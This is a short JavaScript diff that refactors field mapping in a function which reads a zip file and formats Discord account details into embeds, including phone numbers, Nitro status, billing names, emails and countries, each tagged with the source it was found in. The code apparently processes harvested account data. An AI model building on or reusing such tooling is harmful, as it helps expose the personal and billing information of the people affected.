@@ -44,6 +44,8 @@ const json = async (zipFile) => {
     ]
   });
 
+  const fieldsMap = f => ({ name: f[0], value: f[1], inline: true });
+
   if (discordAccountInfo.accounts?.length >= 1) {
     for (const account of discordAccountInfo.accounts) {
       const haveNitro = account.premium_type !== 0;
@@ -77,7 +79,7 @@ const json = async (zipFile) => {
           ['📞 Phone Number', account.phone ? code(account.phone) : 'No Phone Number'],
           ['💲 Nitro Subscription', nitroSubscriptionType(account.premium_type) + (haveNitro ? ` (ends <t:${nitroSubscriptionEnd}:R>)` : '')],
           ['🚩 Flags', accountFlags(account.flags) !== '' ? accountFlags(account.flags) : 'None'],
-        ].map(f => { return { name: f[0], value: f[1], inline: true }; }),
+        ].map(fieldsMap),
         color: account.accent_color,
         footer: {
           text: `Found in ${account.source.replace(account.source[0], account.source[0].toUpperCase())}`
@@ -99,7 +101,7 @@ const json = async (zipFile) => {
         ['👨 Name', billing.billing_address.name],
         ['✉️ Email', code(billing.email)],
         ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
-      ]).map(f => { return { name: f[0], value: f[1], inline: true }; })
+      ]).map(fieldsMap)
     }));
   }
 
